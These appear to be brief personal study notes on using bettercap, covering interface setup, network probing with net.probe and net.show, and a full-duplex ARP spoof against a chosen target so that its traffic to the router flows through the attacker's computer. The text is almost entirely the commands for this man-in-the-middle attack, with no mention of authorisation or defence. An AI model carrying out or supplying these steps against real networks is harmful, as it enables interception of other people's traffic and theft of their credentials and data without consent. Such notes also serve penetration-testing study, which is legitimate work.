# Using bettercap

- instead of complicating our lives with arpspoofing directly we can use a program called bettercap for arp spoofing
- `bettercap -iface eth0` (for now or we can use the wireless adapter similarly)
- after this type help to see which modules are on 
- we can do net.probe on to probe the devices connected to the same network
- this automatically turns net.recon on
- we can then do a net.show to get a better idea of the devices connected to our network

### Doing an arpspoof with bettercap
- `set arp.spoof.fullduplex true`
- `set arp.spoof.targets xx:xx:xx:xx (target IP)`
- `arp.spoof on`
--- 
*Now all the information that the target device sends to the router flows through our computer*